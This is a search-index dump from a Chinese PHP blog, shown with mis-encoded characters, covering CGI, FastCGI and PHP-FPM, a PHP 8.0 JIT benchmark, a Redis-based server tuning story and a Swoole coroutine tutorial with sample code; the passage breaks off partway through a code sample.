CGIåè®®è§„å®šäº†éœ€è¦å‘CGIè„šæœ¬è®¾ç½®çš„ç¯å¢ƒå˜é‡å’Œä¸€äº›å…¶ä»–ä¿¡æ¯ï¼ŒCGIç¨‹åºå®ŒæˆæŸä¸€ä¸ªåŠŸèƒ½ï¼Œå¯ä»¥ç”¨PHPï¼ŒPythonï¼ŒShellæˆ–è€…Cè¯­è¨€ç¼–å†™ã€‚ åœ¨æ²¡æœ‰CGI ä¹‹å‰ï¼Œå…¶ä»–è¯­è¨€å¦‚æœéœ€è¦æ¥å…¥Mysql æˆ–è€…Memcacheï¼Œè¿˜éœ€è¦ä½¿ç”¨C è¯­è¨€ï¼Œä½†æœ‰äº†CGIåè®®ï¼Œæˆ‘ä»¬çš„Webå¤„ç†æµç¨‹å¯ä»¥å˜æˆä¸‹å›¾è¿™æ ·ï¼š FastCGI çš„è¯ç”ŸCGIç¨‹åºå­˜åœ¨è‡´å‘½çš„ç¼ºç‚¹ï¼šæ¯å½“å®¢æˆ·ç«¯å‘èµ·è¯·æ±‚ï¼ŒæœåŠ¡å™¨å°†è¯·æ±‚è½¬å‘ç»™CGIï¼ŒWEB æœåŠ¡å™¨å°±è¯·æ±‚æ“ä½œç³»ç»Ÿç”Ÿæˆä¸€ä¸ªæ–°çš„CGIè§£é‡Šå™¨è¿›ç¨‹(å¦‚php-cgiï¼‰ï¼ŒCGIè¿›ç¨‹åˆ™å¤„ç†å®Œä¸€ä¸ªè¯·æ±‚åé€€å‡ºï¼Œä¸‹ä¸€ä¸ªè¯·æ±‚æ¥æ—¶å†åˆ›å»ºæ–°è¿›ç¨‹ã€‚ æˆ‘ä»¬çŸ¥é“ï¼Œæ‰§è¡Œä¸€ä¸ªPHPç¨‹åºçš„å¿…é¡»è¦å…ˆè§£æphp.iniæ–‡ä»¶ï¼Œç„¶åæ¨¡å—åˆå§‹åŒ–ç­‰ç­‰ä¸€ç³»åˆ—å·¥ä½œï¼Œæ¯æ¬¡éƒ½åå¤è¿™æ ·éå¸¸æµªè´¹èµ„æºã€‚ FastCGIåè®®åœ¨CGIåè®®çš„åŸºç¡€ä¸Šï¼Œåšå‡ºäº†å¦‚ä¸‹æ”¹å˜ï¼š FastCGIè¢«è®¾è®¡ç”¨æ¥æ”¯æŒå¸¸é©»ï¼ˆlong-livedï¼‰åº”ç”¨è¿›ç¨‹ï¼Œå‡å°‘äº†fork-and-executeå¸¦æ¥çš„å¼€é”€ FastCGIè¿›ç¨‹é€šè¿‡ç›‘å¬çš„socketï¼Œæ”¶æ¥è‡ªWebæœåŠ¡å™¨çš„è¿æ¥ï¼Œè¿™æ ·FastCGI è¿›ç¨‹å¯ä»¥ç‹¬ç«‹éƒ¨ç½² æœåŠ¡å™¨å’ŒFastCGIç›‘å¬çš„socket ä¹‹é—´æŒ‰ç…§æ¶ˆæ¯çš„å½¢å¼å‘é€ç¯å¢ƒå˜é‡å’Œå…¶ä»–æ•°æ® æˆ‘ä»¬ç§°å®ç°äº†FastCGIåè®®çš„ç¨‹åºä¸ºFastCGIç¨‹åºï¼ŒFastCGIç¨‹åºçš„äº¤äº’æ–¹å¼å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š PHP-FPM çš„è¯ç”ŸFastCGI ç¨‹åºå›ºç„¶å·²ç»å¾ˆå¥½äº†ï¼Œä½†æˆ‘ä»¬çš„éœ€æ±‚æ€»æ˜¯æœ‰ç‚¹è‹›åˆ»ï¼Œå®ƒè¿˜æ˜¯å­˜åœ¨ä¸€äº›æ˜æ˜¾ç¼ºç‚¹çš„ï¼š å½“æˆ‘ä»¬æ›´æ”¹é…ç½®æ–‡ä»¶(php.ini)åï¼Œphp-cgiï¼ˆFastCGI ç¨‹åºï¼‰ æ— æ³•å¹³æ»‘é‡å¯ æˆ‘ä»¬forkçš„è¿›ç¨‹ä¸ªæ•°å’Œè¯·æ±‚é‡æ­£æ¯”ï¼Œè¯·æ±‚ç¹å¿™æ—¶ fork è¿›ç¨‹å¤šï¼ŒåŠ¨æ€è°ƒæ•´ php-cgiè¿˜æ²¡åšåˆ° ä¸Šé¢æåŠphp-cgi å®ç°çš„FastCGIé—®é¢˜å®˜æ–¹æ²¡æœ‰è§£å†³ï¼Œå¹¸è¿çš„æ˜¯æœ‰ç¬¬ä¸‰æ–¹å¸®æˆ‘ä»¬è§£å†³äº†ï¼Œå®ƒå°±æ˜¯ php-fpmã€‚ å®ƒå¯ä»¥ç‹¬ç«‹è¿è¡Œï¼Œä¸ä¾èµ–php-cgiï¼Œæ¢å¥è¯è¯´ï¼Œå®ƒè‡ªå·±å®ç°äº†FastCGIåè®®å¹¶ä¸”æ”¯æŒè¿›ç¨‹å¹³æ»‘é‡å¯ä¸”å¸¦è¿›ç¨‹ç®¡ç†åŠŸèƒ½ã€‚ è¿›ç¨‹åŒ…å« master è¿›ç¨‹å’Œ worker è¿›ç¨‹ä¸¤ç±»è¿›ç¨‹ã€‚ master è¿›ç¨‹åªæœ‰ä¸€ä¸ªï¼Œè´Ÿè´£ç›‘å¬ç«¯å£ï¼Œæ¥æ”¶æ¥è‡ªWeb Server çš„è¯·æ±‚ï¼Œè€Œ worker è¿›ç¨‹åˆ™ä¸€èˆ¬æœ‰å¤šä¸ªï¼ˆå…·ä½“æ•°é‡æ ¹æ®å®é™…éœ€è¦é…ç½®ï¼‰ï¼Œæ¯ä¸ªè¿›ç¨‹å†…éƒ¨éƒ½åµŒå…¥äº†ä¸€ä¸ªPHP è§£é‡Šå™¨ï¼Œæ˜¯PHP ä»£ç æ­£çœŸæ‰§è¡Œçš„åœ°æ–¹ã€‚ å‚è€ƒé“¾æ¥ ä»CGIåˆ°FastCGIåˆ°PHP-FPM","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"PHP-FPM","slug":"PHP-FPM","permalink":"https://www.0x2beace.com/tags/PHP-FPM/"}]},{"title":"PHP 8.0 åˆä½“éªŒ","slug":"php-8-0-first-experience","date":"2020-12-01T13:09:15.000Z","updated":"2020-12-02T00:03:35.910Z","comments":true,"path":"php-8-0-first-experience/","link":"","permalink":"https://www.0x2beace.com/php-8-0-first-experience/","excerpt":"æ˜¨å¤©ä½¿ç”¨ homebrew å®‰è£…è½¯ä»¶æ—¶ï¼Œç»“æœæŠŠæˆ‘æœ¬åœ°å·²å®‰è£…çš„è½¯ä»¶ä¸­èƒ½æ›´æ–°çš„å…¨éƒ¨ç»™æ›´æ–°äº†ä¸€éã€‚","text":"æ˜¨å¤©ä½¿ç”¨ homebrew å®‰è£…è½¯ä»¶æ—¶ï¼Œç»“æœæŠŠæˆ‘æœ¬åœ°å·²å®‰è£…çš„è½¯ä»¶ä¸­èƒ½æ›´æ–°çš„å…¨éƒ¨ç»™æ›´æ–°äº†ä¸€éã€‚ è¿™å…¶ä¸­å°±åŒ…æ‹¬ php8.0ã€‚åœ¨8.0 æ­£å¼å‡ºæ¥ä¹‹å‰ï¼Œæœ‰å¬è¯´è¿‡åŠ å…¥äº†æ–°ç‰¹æ€§ï¼šJITç¼–è¯‘ã€‚ ä»ç†è®ºä¸Šè®²ï¼ŒJITå¤„ç†PHPè„šæœ¬ç¼–è¯‘çš„æ–¹å¼èƒ½å¤Ÿæé«˜åº”ç”¨ç¨‹åºçš„é€Ÿåº¦ï¼Œä½†ç©¶ç«Ÿèƒ½æœ‰å¤šå¿«å‘¢ï¼Ÿä¸‹é¢é€šè¿‡ä¸€ä¸ªç®€å•çš„ä¾‹å­æ¥çœ‹çœ‹ã€‚ 123456789101112131415161718&lt;?php$startTime &#x3D; microtime(true);$mysqli &#x3D; new Mysqli(&quot;127.0.0.1&quot;, &quot;root&quot;, &quot;root&quot;);function doSomething($db,$i)&#123; $hash &#x3D; md5($i); $db-&gt;query(&quot;INSERT INTO local.test(id, hash) VALUES($i, \\&quot;$hash\\&quot;)&quot;);&#125;$i &#x3D; 1;while ($i&lt;100000) &#123; doSomething($mysqli, $i); $i++;&#125;$total &#x3D; microtime(true) - $startTime;var_dump(&quot;æ€»è€—æ—¶ï¼š&#123;$total&#125;ç§’&quot;); è¿™é‡Œåªæ˜¯ç®€å•çš„å‘æ•°æ®åº“ä¸é‡å¤æ’å…¥åä¸‡æ¡æ•°æ®ã€‚æˆ‘çŸ¥é“ç”¨è¿™ä¸ªè„šæœ¬ä¸¾ä¾‹å­å¹¶ä¸å¥½ï¼Œä½†å®ƒå´æ˜¯ç¦»æˆ‘æ—¥å¸¸ä½¿ç”¨æœ€è¿‘çš„ã€‚ php7.3 æµ‹è¯•ç»“æœï¼š php8.0 æœªå¼€å¯ JIT æ‰©å±•æµ‹è¯•ç»“æœï¼š php8.0 å·²å¼€å¯ JIT æ‰©å±•æµ‹è¯•ç»“æœï¼š å¯ä»¥çœ‹åˆ°ç›¸æ¯” 7.3ï¼Œè¶³è¶³å¿«äº†è¿‘ä¸‰åˆ†ä¹‹ä¸€ï¼ å½“ç„¶è¿™ä¸ªæµ‹è¯•ç»“æœä¸¥æ ¼æ„ä¹‰ä¸Šæ¥è®²ï¼Œå¹¶ä¸å‡†ç¡®ï¼Œä½†çœ‹åˆ°æ•°å­—ä»å››åå¤šç§’ç¼©çŸ­åˆ°ä¸‰åç§’ï¼Œè¿˜æ˜¯å¾ˆæƒŠå–œçš„ã€‚ æˆ‘çš„ç”µè„‘é…ç½®ï¼š 3.5 GHz åŒæ ¸Intel Core i7 16 GB RAM","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"è®°ä¸€æ¬¡ Linux æœåŠ¡å™¨æ€§èƒ½è°ƒä¼˜","slug":"remember-a-Linux-server-performance-tuning","date":"2020-11-30T15:45:09.000Z","updated":"2020-12-06T14:52:17.447Z","comments":true,"path":"remember-a-Linux-server-performance-tuning/","link":"","permalink":"https://www.0x2beace.com/remember-a-Linux-server-performance-tuning/","excerpt":"è½®è¯¢æŸ¥ Db å¯¹æœåŠ¡å™¨ï¼ˆæ•°æ®åº“ï¼‰çš„å‹åŠ›ç©¶ç«Ÿæœ‰å¤šå¤§ï¼Ÿ","text":"è½®è¯¢æŸ¥ Db å¯¹æœåŠ¡å™¨ï¼ˆæ•°æ®åº“ï¼‰çš„å‹åŠ›ç©¶ç«Ÿæœ‰å¤šå¤§ï¼Ÿ å‰æ®µæ—¶é—´æ¥æ‰‹ä¸€ä¸ªè€ç³»ç»Ÿï¼Œå…¶ä¸­å¯¹äºâ€œè®¢å•â€çš„å¤„ç†ï¼Œéå¸¸åŸå§‹ä¸”ç®€å•ç²—æš´ã€‚ ç›´æ¥é€šè¿‡ä¸€ä¸ª PHP è„šæœ¬ä¸æ–­è½®è¯¢æŸ¥è¯¢æ•°æ®åº“ï¼Œç›´åˆ°æŸ¥æ‰¾åˆ°éœ€è¦å¤„ç†çš„â€œè®¢å•â€æ‰å»å¤„ç†ï¼Œå¦åˆ™ä¸€ç›´æŸ¥æ‰¾ã€‚ 12345678910111213&lt;?phpfunction doSomething()&#123; &#x2F;&#x2F; æŸ¥è¯¢æ•°æ®åº“ if ($exists)&#123; &#x2F;&#x2F; todo ... &#125;&#125;while(true)&#123; doSomething();&#125; ç±»ä¼¼çš„å¤„ç†è¿˜æœ‰å…¶ä»–å‡ ä¸ªè„šæœ¬ã€‚ å› ä¸ºé¡¹ç›®çš„å†å²åŒ…è¢±è¾ƒé‡ï¼Œä¹Ÿä¸å¥½åšä¸€äº›å¤§è°ƒæ•´ï¼Œèµ·åˆæˆ‘å¹¶æ²¡æœ‰å¤ªåœ¨æ„ï¼Œå°±ç›´æ¥éƒ¨ç½²åˆ°æœåŠ¡å™¨ä¸Šäº†ã€‚ å°±åœ¨æœ€è¿‘ï¼Œæˆ‘æ”¶åˆ°åé¦ˆï¼Œç³»ç»Ÿæœ‰é—®é¢˜ã€‚é€šè¿‡ä¸€ç³»åˆ—æ’æŸ¥æœ€åå‘ç°æ˜¯å› ä¸ºâ€œè®¢å•â€å¤„ç†ä¸åŠæ—¶ï¼Œâ€œè®¢å•â€å †ç§¯è¿‡å¤šå¯¼è‡´çš„ä¸€ç³»åˆ—é—®é¢˜ã€‚ æˆ‘å¯»æ€ç€ï¼Œç”¨æˆ·é‡ä¹Ÿæ²¡æœ‰å¾ˆå¤šï¼Œä¸ºä»€ä¹ˆä¼šå¤„ç†ä¸å®Œå‘¢ï¼Ÿä½¿ç”¨ glances å‘½ä»¤çœ‹äº†ä¸€çœ¼ã€‚ è¿™ä¸çœ‹ä¸çŸ¥é“ï¼Œä¸€çœ‹å“ä¸€è·³ï¼ŒCPU ç›´æ¥è­¦å‘Šäº†ã€‚æ— è®ºå¤šå¥½çš„æœºå™¨ä¹Ÿç»å—ä¸ä½è¿™æ ·æŠ˜è…¾ï¼Œèµ¶ç´§æŠŠè½®è¯¢æŸ¥è¡¨çš„æ–¹å¼æ”¹æˆäº†æŸ¥é˜Ÿåˆ—ã€‚ åŸºäºRedis çš„List å®ç°ä¸€ä¸ªç®€å•çš„æ¶ˆæ¯é˜Ÿåˆ—ï¼Œæ›´æ–°åˆ°æœåŠ¡å™¨ä¹‹åï¼Œå¯ä»¥çœ‹åˆ°CPU ç›´æ¥é™äº†ä¸€åŠã€‚ ä¸ºä»€ä¹ˆä½¿ç”¨Redis ä¼šæ¯”Mysql çš„æ•ˆæœè¦å¥½ï¼Ÿ é€šä¿—ä¸€ç‚¹è§£é‡Šæ˜¯å› ä¸ºRedis å­˜å‚¨æ˜¯åŸºäºå†…å­˜ï¼ŒMysql å­˜å‚¨æ˜¯åŸºäºç£ç›˜ï¼Œè€Œå†…å­˜çš„è¯»å†™è¦æ¯”ç£ç›˜å¿«ä¸æ­¢ä¸€ä¸ªæ•°é‡çº§ã€‚ å½“ç„¶ï¼Œä¸Šé¢çš„å¤„ç†æ–¹å¼å¹¶ä¸æ˜¯æœ€ä¼˜çš„ï¼Œè¿™é‡Œåªæ˜¯å•è®ºå¦‚ä½•å‘ç°æ€§èƒ½ç“¶é¢ˆï¼Œä»¥åŠå¦‚ä½•è°ƒä¼˜è¿™ä¸€ç‚¹æ¥è¿›è¡Œè¯´æ˜ã€‚","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"PHP","slug":"Linux/PHP","permalink":"https://www.0x2beace.com/categories/Linux/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"è¿ç»´","slug":"è¿ç»´","permalink":"https://www.0x2beace.com/tags/%E8%BF%90%E7%BB%B4/"},{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/tags/Redis/"}]},{"title":"Swoole åç¨‹å­¦ä¹ ","slug":"swoole-coroutine-learning","date":"2020-11-29T14:36:47.000Z","updated":"2020-11-29T14:37:50.672Z","comments":true,"path":"swoole-coroutine-learning/","link":"","permalink":"https://www.0x2beace.com/swoole-coroutine-learning/","excerpt":"ç¬¬ä¸€æ¬¡æ¥è§¦åç¨‹è¿™ä¸ªæ¦‚å¿µï¼Œæ˜¯åœ¨å­¦ä¹ Swooleæ—¶ï¼Œé‚£æ—¶çœ‹å®˜æ–¹æ–‡æ¡£å¹¶ä¸èƒ½å®Œå…¨ç†è§£åç¨‹åˆ°åº•æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿ä»¥åŠè¯¥å¦‚ä½•æ­£ç¡®çš„ä½¿ç”¨å®ƒã€‚","text":"ç¬¬ä¸€æ¬¡æ¥è§¦åç¨‹è¿™ä¸ªæ¦‚å¿µï¼Œæ˜¯åœ¨å­¦ä¹ Swooleæ—¶ï¼Œé‚£æ—¶çœ‹å®˜æ–¹æ–‡æ¡£å¹¶ä¸èƒ½å®Œå…¨ç†è§£åç¨‹åˆ°åº•æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿ä»¥åŠè¯¥å¦‚ä½•æ­£ç¡®çš„ä½¿ç”¨å®ƒã€‚ åæ¥é€æ¸çœ‹äº†ä¸€äº›å†™çš„æ¯”è¾ƒé€šä¿—çš„æ–‡ç« ï¼ŒåŠ ä¸Šè‡ªå·±çš„ä¸€äº›ç†è§£ï¼Œé€æ­¥å¼€å§‹å¯¹åç¨‹æœ‰ä¸€äº›è®¤è¯†äº†ã€‚ è®¤è¯†åç¨‹åç¨‹ä¸æ˜¯è¿›ç¨‹æˆ–çº¿ç¨‹ï¼Œå…¶æ‰§è¡Œè¿‡ç¨‹æ›´ç±»ä¼¼äºå­ä¾‹ç¨‹ï¼Œæˆ–è€…è¯´ä¸å¸¦è¿”å›å€¼çš„å‡½æ•°è°ƒç”¨ã€‚ ä¸Šé¢é‚£å¥è¯å¾ˆå…³é”®ï¼Œä¸€å¥è¯å°±æŠŠåç¨‹æ˜¯ä»€ä¹ˆï¼Œä¸æ˜¯ä»€ä¹ˆè¯´æ¸…æ¥šäº†ã€‚ ä¸‹é¢è¿™å¼ å›¾å¯ä»¥å¾ˆæ¸…æ™°çš„çœ‹åˆ°åç¨‹ä¸å¤šè¿›ç¨‹çš„åŒºåˆ«ï¼š æ‰§è¡Œé¡ºåºä¸‹é¢è¿™æ®µä»£ç ä¸»è¦åšäº†ä¸‰ä»¶äº‹ï¼šå†™å…¥æ–‡ä»¶ã€å‘é€é‚®ä»¶ä»¥åŠæ’å…¥æ•°æ®ã€‚ 12345678910111213141516171819202122232425&lt;?phpfunction task1()&#123; for ($i&#x3D;0;$i&lt;&#x3D;300;$i++)&#123; &#x2F;&#x2F;å†™å…¥æ–‡ä»¶,å¤§æ¦‚è¦3000å¾®ç§’ usleep(3000); echo &quot;å†™å…¥æ–‡ä»¶&#123;$i&#125;\\n&quot;; &#125;&#125;function task2()&#123; for ($i&#x3D;0;$i&lt;&#x3D;500;$i++)&#123; &#x2F;&#x2F;å‘é€é‚®ä»¶ç»™500åä¼šå‘˜,å¤§æ¦‚3000å¾®ç§’ usleep(3000); echo &quot;å‘é€é‚®ä»¶&#123;$i&#125;\\n&quot;; &#125;&#125;function task3()&#123; for ($i&#x3D;0;$i&lt;&#x3D;100;$i++)&#123; &#x2F;&#x2F;æ¨¡æ‹Ÿæ’å…¥100æ¡æ•°æ®,å¤§æ¦‚3000å¾®ç§’ usleep(3000); echo &quot;æ’å…¥æ•°æ®&#123;$i&#125;\\n&quot;; &#125;&#125;task1();task2();task3(); è¿™æ®µä»£ç å’Œä¸Šé¢ä¸åŒçš„æ˜¯ï¼Œè¿™ä¸‰ä»¶äº‹æƒ…æ˜¯äº¤å‰æ‰§è¡Œçš„ï¼Œæ¯ä¸ªä»»åŠ¡æ‰§è¡Œå®Œä¸€æ¬¡ä¹‹åï¼Œåˆ‡æ¢åˆ°å¦ä¸€ä¸ªä»»åŠ¡ï¼Œå¦‚æ­¤å¾ªç¯ã€‚ ç±»ä¼¼äºè¿™æ ·çš„æ‰§è¡Œé¡ºåºï¼Œå°±æ˜¯åç¨‹ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpfunction task1($i)&#123; &#x2F;&#x2F;ä½¿ç”¨$iæ ‡è¯† å†™å…¥æ–‡ä»¶,å¤§æ¦‚è¦3000å¾®ç§’ if ($i &gt; 300) &#123; return false;&#x2F;&#x2F;è¶…è¿‡300ä¸ç”¨å†™äº† &#125; echo &quot;å†™å…¥æ–‡ä»¶&#123;$i&#125;\\n&quot;; usleep(3000); return true;&#125;function task2($i)&#123; &#x2F;&#x2F;ä½¿ç”¨$iæ ‡è¯† å‘é€é‚®ä»¶,å¤§æ¦‚è¦3000å¾®ç§’ if ($i &gt; 500) &#123; return false;&#x2F;&#x2F;è¶…è¿‡500ä¸ç”¨å‘é€äº† &#125; echo &quot;å‘é€é‚®ä»¶&#123;$i&#125;\\n&quot;; usleep(3000); return true;&#125;function task3($i)&#123; &#x2F;&#x2F;ä½¿ç”¨$iæ ‡è¯† æ’å…¥æ•°æ®,å¤§æ¦‚è¦3000å¾®ç§’ if ($i &gt; 100) &#123; return false;&#x2F;&#x2F;è¶…è¿‡100ä¸ç”¨æ’å…¥ &#125; echo &quot;æ’å…¥æ•°æ®&#123;$i&#125;\\n&quot;; usleep(3000); return true;&#125;$i &#x3D; 0;while (true) &#123; $task1Result &#x3D; task1($i); $task2Result &#x3D; task2($i); $task3Result &#x3D; task3($i); if($task1Result&#x3D;&#x3D;&#x3D;false&amp;&amp;$task2Result&#x3D;&#x3D;&#x3D;false&amp;&amp;$task3Result&#x3D;&#x3D;&#x3D;false)&#123; break;&#x2F;&#x2F;å…¨éƒ¨ä»»åŠ¡å®Œæˆ,é€€å‡ºå¾ªç¯ &#125; $i++;&#125; swooleå®ç°åç¨‹ä»£ç ï¼š 12345678910111213141516171819202122232425262728&lt;?phpfunction task1()&#123; for ($i&#x3D;0;$i&lt;&#x3D;300;$i++)&#123; &#x2F;&#x2F;å†™å…¥æ–‡ä»¶,å¤§æ¦‚è¦3000å¾®ç§’ usleep(3000); echo &quot;å†™å…¥æ–‡ä»¶&#123;$i&#125;\\n&quot;; Co::sleep(0.001);&#x2F;&#x2F;æŒ‚èµ·å½“å‰åç¨‹,0.001ç§’åæ¢å¤&#x2F;&#x2F;ç›¸å½“äºåˆ‡æ¢åç¨‹ &#125;&#125;function task2()&#123; for ($i&#x3D;0;$i&lt;&#x3D;500;$i++)&#123; &#x2F;&#x2F;å‘é€é‚®ä»¶ç»™500åä¼šå‘˜,å¤§æ¦‚3000å¾®ç§’ usleep(3000); echo &quot;å‘é€é‚®ä»¶&#123;$i&#125;\\n&quot;; Co::sleep(0.001);&#x2F;&#x2F;æŒ‚èµ·å½“å‰åç¨‹,0.001ç§’åæ¢å¤&#x2F;&#x2F;ç›¸å½“äºåˆ‡æ¢åç¨‹ &#125;&#125;function task3()&#123; for ($i&#x3D;0;$i&lt;&#x3D;100;$i++)&#123; &#x2F;&#x2F;æ¨¡æ‹Ÿæ’å…¥100æ¡æ•°æ®,å¤§æ¦‚3000å¾®ç§’ usleep(3000); echo &quot;æ’å…¥æ•°æ®&#123;$i&#125;\\n&quot;; Co::sleep(0.001);&#x2F;&#x2F;æŒ‚èµ·å½“å‰åç¨‹,0.001ç§’åæ¢å¤&#x2F;&#x2F;ç›¸å½“äºåˆ‡æ¢åç¨‹ &#125;&#125;$pid1 &#x3D; go(&#39;task1&#39;);&#x2F;&#x2F;goå‡½æ•°æ˜¯swooleçš„å¼€å¯åç¨‹å‡½æ•°ï¼Œç”¨äºå¼€å¯ä¸€ä¸ªåç¨‹$pid2 &#x3D; go(&#39;task2&#39;);$pid3 &#x3D; go(&#39;task3&#39;); åç¨‹ä¸å¤šè¿›ç¨‹ç”±ä¸Šé¢çš„ä»£ç ï¼Œå¯ä»¥å‘ç°ï¼Œåç¨‹å…¶å®åªæ˜¯è¿è¡Œåœ¨ä¸€ä¸ªè¿›ç¨‹ä¸­çš„å‡½æ•°ï¼Œåªæ˜¯è¿™ä¸ªå‡½æ•°ä¼šè¢«åˆ‡æ¢åˆ°ä¸‹ä¸€ä¸ªæ‰§è¡Œã€‚ éœ€è¦æ³¨æ„çš„æ˜¯âš ï¸ï¼š åç¨‹å¹¶ä¸æ˜¯å¤šä»»åŠ¡å¹¶è¡Œå¤„ç†ï¼Œå®ƒå±äºå¤šä»»åŠ¡ä¸²è¡Œå¤„ç†ï¼Œå®ƒä¿©çš„æœ¬è´¨åŒºåˆ«æ˜¯åœ¨æŸä¸ªæ—¶åˆ»åŒæ—¶æ‰§è¡Œä¸€ä¸ªè¿˜æ˜¯å¤šä¸ªä»»åŠ¡ã€‚ åç¨‹çš„ä½œç”¨åŸŸç”±äºåç¨‹å°±æ˜¯è¿›ç¨‹ä¸­ä¸€ä¸²ä»»åŠ¡ä»£ç ï¼Œæ‰€ä»¥å®ƒçš„å…¨å±€å˜é‡ã€é™æ€å˜é‡ç­‰å˜é‡éƒ½æ˜¯å…±äº«çš„ï¼ŒåŒ…æ‹¬ PHP çš„å…¨å±€ç¼“å†²åŒºã€‚ æ‰€ä»¥åœ¨å¼€å‘æ—¶ç‰¹åˆ«éœ€è¦æ³¨æ„ä½œç”¨åŸŸç›¸å…³çš„é—®é¢˜ã€‚ åç¨‹çš„I/Oè¿æ¥åœ¨åç¨‹ä¸­ï¼Œè¦ç‰¹åˆ«æ³¨æ„ä¸èƒ½å…±ç”¨ä¸€ä¸ª I/O è¿æ¥ï¼Œå¦åˆ™ä¼šé€ æˆæ•°æ®å¼‚å¸¸ã€‚ ç”±äºåç¨‹çš„äº¤å‰è¿è¡Œæœºåˆ¶ï¼Œä¸”å„ä¸ªåç¨‹çš„ I/O è¿æ¥éƒ½å¿…é¡»æ˜¯ç›¸äº’ç‹¬ç«‹çš„ï¼Œè¿™æ—¶å¦‚æœä½¿ç”¨ä¼ ç»Ÿçš„ç›´æ¥å»ºç«‹è¿æ¥æ–¹å¼ï¼Œä¼šå¯¼è‡´æ¯ä¸ªåç¨‹éƒ½éœ€è¦å»ºç«‹è¿æ¥ã€é—­å…³è¿æ¥ï¼Œä»è€Œæ¶ˆè€—å¤§é‡èµ„æºã€‚é‚£ä¹ˆè¯¥å¦‚ä½•è§£å†³åç¨‹çš„ I/O è¿æ¥é—®é¢˜å‘¢ï¼Ÿè¿™ä¸ªæ—¶å€™å°±éœ€è¦ç”¨åˆ°è¿æ¥æ± äº†ã€‚ è¿æ¥æ± å­˜åœ¨çš„æ„ä¹‰åœ¨äºï¼Œå¤ç”¨åŸæ¥çš„è¿æ¥ï¼Œä»è€ŒèŠ‚çœé‡å¤å»ºç«‹è¿æ¥æ‰€å¸¦æ¥çš„å¼€é”€ã€‚ åç¨‹çš„å®é™…åº”ç”¨åœºæ™¯è¯´äº†è¿™ä¹ˆå¤šï¼Œé‚£åç¨‹å€’åº•èƒ½è§£å†³å“ªäº›å®é™…ä¸šåŠ¡åœºæ™¯å‘¢ï¼Ÿä¸‹é¢é€šè¿‡ä¸€ä¸ªå®ä¾‹æ¥å¿«é€Ÿä¸Šæ‰‹åç¨‹ï¼ˆç¬”è€…å½“æ—¶å†™è¿™ç¯‡æ–‡ç« æ—¶ï¼Œå¯¹åç¨‹çš„ç†è§£è¿˜ä¸å¤Ÿæ·±åˆ»ï¼Œæ‰€ä»¥è¿™é‡Œå¼•ç”¨zxr615 çš„â€åšé¥­â€œçš„ä¾‹å­æ¥ç†è§£åç¨‹ï¼‰ï¼š ä¼ ç»ŸåŒæ­¥é˜»å¡å®ç°é€»è¾‘ï¼š 12345678910111213141516171819202122232425&lt;?phpfunction cook()&#123; $startTime &#x3D; time(); echo &quot;å¼€å§‹ç…²æ±¤...&quot; . PHP_EOL; sleep(10); echo &quot;æ±¤å¥½äº†...&quot; . PHP_EOL; echo &quot;å¼€å§‹ç…®é¥­...&quot; . PHP_EOL; sleep(8); echo &quot;é¥­ç†Ÿäº†...&quot; . PHP_EOL; echo &quot;æ”¾æ²¹...&quot; . PHP_EOL; sleep(1); echo &quot;ç…é±¼...&quot; . PHP_EOL; sleep(3); echo &quot;æ”¾ç›...&quot; . PHP_EOL; sleep(1); echo &quot;å‡ºé”…...&quot; . PHP_EOL; var_dump(&#39;æ€»è€—æ—¶ï¼š&#39; . (time() - $startTime) . &#39; åˆ†é’Ÿ&#39;);&#125;cook(); åç¨‹å®ç°é€»è¾‘ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687&lt;?phpuse Swoole\\Coroutine;use Swoole\\Coroutine\\WaitGroup;use Swoole;class Cook&#123; public function cookByCo() &#123; $startTime &#x3D; time(); &#x2F;&#x2F; å¼€å¯ä¸€é”®åç¨‹åŒ–: https:&#x2F;&#x2F;wiki.swoole.com&#x2F;#&#x2F;runtime?id&#x3D;swoole_hook_all Swoole\\Runtime::enableCoroutine($flags &#x3D; SWOOLE_HOOK_ALL); &#x2F;&#x2F; åˆ›å»ºä¸€ä¸ªåç¨‹å®¹å™¨: https:&#x2F;&#x2F;wiki.swoole.com&#x2F;#&#x2F;coroutine&#x2F;scheduler &#x2F;&#x2F; ç›¸å½“äºè¿›å…¥å¨æˆ¿ \\Co\\run(function () &#123; &#x2F;&#x2F; ç­‰å¾…ç»“æœ: https:&#x2F;&#x2F;wiki.swoole.com&#x2F;#&#x2F;coroutine&#x2F;wait_group?id&#x3D;waitgroup &#x2F;&#x2F; è®°å½•å“ªé“èœåšå¥½äº†ï¼Œå“ªé“èœè¿˜éœ€è¦å¤šé•¿æ—¶é—´ $wg &#x3D; new WaitGroup(); &#x2F;&#x2F; ä¿å­˜æ•°æ®çš„ç»“æœ &#x2F;&#x2F; è£…å¥½çš„èœ $result &#x3D; []; &#x2F;&#x2F; è®°å½•ä¸€ä¸‹ç…²æ±¤(è®°å½•ä¸€ä¸ªä»»åŠ¡) $wg-&gt;add(); &#x2F;&#x2F; åˆ›å»ºä¸€ä¸ªç…²æ±¤ä»»åŠ¡(å¼€å¯ä¸€ä¸ªæ–°çš„åç¨‹) Coroutine::create(function () use ($wg, &amp;$result) &#123; echo &quot;å¼€å§‹ç…²æ±¤...&quot; . PHP_EOL; &#x2F;&#x2F; ç…²æ±¤éœ€è¦6åˆ†é’Ÿï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿä¸ç”¨åœ¨è¿™é‡Œç­‰æ±¤ç…®å¥½ï¼Œ &#x2F;&#x2F; 